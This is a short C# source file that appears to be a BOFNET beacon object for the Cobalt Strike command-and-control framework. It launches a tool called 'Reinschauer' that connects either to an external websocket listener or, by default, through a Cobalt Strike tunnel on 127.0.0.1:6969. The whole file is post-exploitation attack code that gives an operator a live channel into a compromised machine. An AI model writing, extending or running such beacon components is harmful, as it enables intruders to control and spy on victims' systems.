using BOFNET;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace reinschauer_dotnet
{
    public class BofStuff : BeaconObject
    {
        public BofStuff(BeaconApi api) : base(api) { }
        public override void Go(string[] args)
        {
            BeaconConsole.WriteLine("[+] R E I N S C H A U E R");

            try
            {
                string[] _args = {"yo", "l", "o"};
                // external websocket listener,
                // not tunneled via CS
                if (args.Length == 3)
                {
                    _args[0] = args[0];
                    _args[1] = args[1];
                    _args[2] = args[2];
                }
                // tunnel via CS
                else
                {
                    _args[0] = "127.0.0.1";
                    _args[1] = "6969";
                    _args[2] = "false";
                }
                Reinschauer.Main(_args);
            }
            catch (Exception ex)
            {
                BeaconConsole.WriteLine(String.Format("\nException: {0}.", ex));
            }
        }
    }
}
